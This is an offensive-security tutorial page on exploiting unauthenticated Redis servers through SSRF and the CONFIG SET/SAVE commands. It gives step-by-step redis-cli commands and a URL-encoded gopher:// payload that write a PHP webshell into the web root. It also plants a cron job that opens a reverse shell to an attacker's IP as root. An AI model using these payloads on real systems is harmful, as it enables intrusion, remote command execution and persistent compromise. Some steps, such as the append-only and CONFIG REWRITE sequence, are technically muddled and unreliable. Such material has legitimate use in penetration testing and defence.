---
title: 'Redis Exploitation: Command Execution Techniques'
description: Explore Redis exploitation techniques for unauthorized command execution
  using SSRF and configuration flaws.
keywords:
- Redis exploitation
- SSRF
- command execution
- unauthenticated access
- CONFIG SET
- SAVE command
- webshell
- reverse shell
- gopher payload
---

# Redis Exploitation

## Context

Redis exploitation enables attackers to achieve command execution on Redis servers by leveraging Server-Side Request Forgery (SSRF) and exploiting unauthenticated misconfigurations. This technique assumes knowledge of server-side request forgery, command execution mechanisms, and Redis configurations.

## Theory

### Redis as an SSRF Target

Redis is an in-memory data store that operates over the TCP protocol, often configured to run on internal networks. Thus, it becomes an attractive target for SSRF exploits. Attackers can craft SSRF payloads that interface with Redis to issue commands or alter its state. If Redis lacks proper authentication, it allows an attacker to control data and issue commands directly to the server.

### Unauthenticated Command Execution in Redis

Default Redis installations may not require authentication, which could leave the server vulnerable to arbitrary command executions when exposed or accessible through misconfigured network settings. Redis inherently trusts clients on internal networks, operating under the assumption that no malicious activity will originate from these sources.

### Abusing CONFIG SET and SAVE for File Write

Redis provides the command `CONFIG SET` to adjust its configuration dynamically, while the command `SAVE` forces a snapshot of the in-memory data to be written to disk. Attackers can exploit these functionalities by setting the database directory (dir) and file name (`dbfilename`) to a location within the web root. They can then store malicious scripts, like a PHP webshell, as key-value pairs and use the `SAVE` command to drop the payload into the desired location, gaining unauthorized control.

### Payload Delivery via SSRF: dict:// and gopher://

SSRF payloads can exploit the `dict://` and `gopher://` protocols to inject raw Redis protocol commands. The `gopher://` protocol, in particular, handles binary-safe payloads, making it effective in bypassing input filters that would block or sanitize `dict://` payloads. This capability allows attackers to seamlessly deliver crafted commands to Redis.

## Practice

### Webshell Drop via CONFIG SET and SAVE

To execute commands on a vulnerable Redis server and drop a webshell, follow these steps:

- Set the Redis database directory to the web server root directory:
    ```bash
    redis-cli -h <target_redis_ip> -p <port> CONFIG SET dir /var/www/html/
    ```

- Set the database file name to end in `.php` so it can be interpreted as a PHP script:
    ```bash
    redis-cli -h <target_redis_ip> -p <port> CONFIG SET dbfilename shell.php
    ```

- Store the PHP webshell in Redis as a key:
    ```bash
    redis-cli -h <target_redis_ip> -p <port> SET webshell "<?php system($_GET['cmd']); ?>"
    ```

- Enable append-only file (AOF) mode to write the payload as plain text:
    ```bash
    redis-cli -h <target_redis_ip> -p <port> CONFIG SET appendonly yes
    ```

- Append the PHP webshell payload to the AOF file:
    ```bash
    redis-cli -h <target_redis_ip> -p <port> APPEND webshell "<?php system($_GET['cmd']); ?>"
    ```
This sequence writes the PHP webshell to the specified location on the server, allowing remote command execution through the webshell.

### SSRF Payload Injection via gopher://

Inject the following gopher payload using SSRF to drop a PHP webshell:

```text
gopher://<redis_ip>:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$9%0d%0awebshell%0d%0a$26%0d%0a<?php system($_GET['cmd']); ?>%0d%0a*3%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$15%0d%0a/var/www/html/%0d%0a*3%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0aSAVE%0d%0a
```

This payload facilitates the creation of a webshell that enables attackers to perform unauthorized actions on the server.

### Reverse Shell via Redis Key Injection

Another method involves injecting a reverse shell command into the server's cron job using Redis commands. Follow these steps:

- Inject a cron job entry that opens a reverse shell back to an attacker's machine:
    ```bash
    redis-cli -h <target_redis_ip> -p <port> SET cron "* * * * * bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1"
    ```

- Set the Redis directory to point to the cron directory where entries can be automatically scheduled:
    ```bash
    redis-cli -h <target_redis_ip> -p <port> CONFIG SET dir /var/spool/cron/
    ```

- Set the file name in the cron directory:
    ```bash
    redis-cli -h <target_redis_ip> -p <port> CONFIG SET dbfilename root
    ```

- Enable append-only mode to ensure the cron job entry is written in plain text:
    ```bash
    redis-cli -h <target_redis_ip> -p <port> CONFIG SET appendonly yes
    redis-cli -h <target_redis_ip> -p <port> CONFIG REWRITE
    ```

If executed with sufficient permissions, this method allows privilege escalation through persistent access to the system.

## Tools

- **redis-cli**
- **Burp Suite**
- **curl**